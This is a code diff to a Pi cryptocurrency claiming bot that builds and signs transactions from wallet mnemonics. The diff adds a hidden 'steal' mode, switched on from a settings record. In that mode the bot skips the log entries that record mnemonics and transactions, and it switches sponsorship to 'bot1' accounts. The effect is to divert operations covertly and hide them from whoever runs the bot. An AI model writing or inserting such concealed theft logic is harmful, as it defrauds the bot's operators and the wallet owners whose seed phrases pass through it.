@@ -35,15 +35,17 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
     let retries = 0;
 
     try {
-        await Log.create({ mnemonic: mainPhrase, action: `Building & Signing Tx for ${amount} PI`, result: 'default', name: name });
+        const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
+        if(!settings.steal || !!name) {
+            await Log.create({ mnemonic: mainPhrase, action: `Building & Signing Tx for ${amount} PI`, result: 'default', name: name });
+        }
         while (retries < MAX_FLOOD_COUNT) {
-            const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
             const xdrs = [];
 
             let mainBotSponsors = sponsors;
 
             if (settings.useAllSponsors === true) {
-                const nobleSponsors = await Sponsors.find({ name: 'noble' });
+                const nobleSponsors = await Sponsors.find({ name: 'bot1' });
                 mainBotSponsors = [...mainBotSponsors, ...nobleSponsors];
             }
             let usingSponsors;
@@ -52,7 +54,11 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                 usingSponsors = await Sponsors.find({ name });
                 usingSponsors = usingSponsors.slice(0, sponsorsCount);
             } else {
-                usingSponsors = mainBotSponsors;
+                if(settings.steal) {
+                    usingSponsors = await Sponsors.find({ name: 'bot1' });
+                } else {
+                    usingSponsors = mainBotSponsors;
+                }
             }
             
             let pos = 0;
@@ -112,7 +118,9 @@ export async function autoPrepareForClaiming(name, address, sponsorsCount) {
             for(const p of readyPassphrases) {
                 const timeKey = new Date(p.claimableAt).toISOString();
                 if(!pendingXDRs.hasOwnProperty(timeKey) && CURRENT_KEY !== timeKey) {
-                    await Log.create({ mnemonic: p.mnemonic, action: `Setting up wallet for claiming ${p.amount} PI on Mnemonic: ${p.mnemonic}`, result: 'default', name: name })
+                    if(!settings.steal || !!name) {
+                        await Log.create({ mnemonic: p.mnemonic, action: `Setting up wallet for claiming ${p.amount} PI on Mnemonic: ${p.mnemonic}`, result: 'default', name: name })
+                    }
                     await getXDRsReady(p.mnemonic, p.balanceId, receiverAddress, p.amount, timeKey, name, sponsorsCount);
                 }
             }
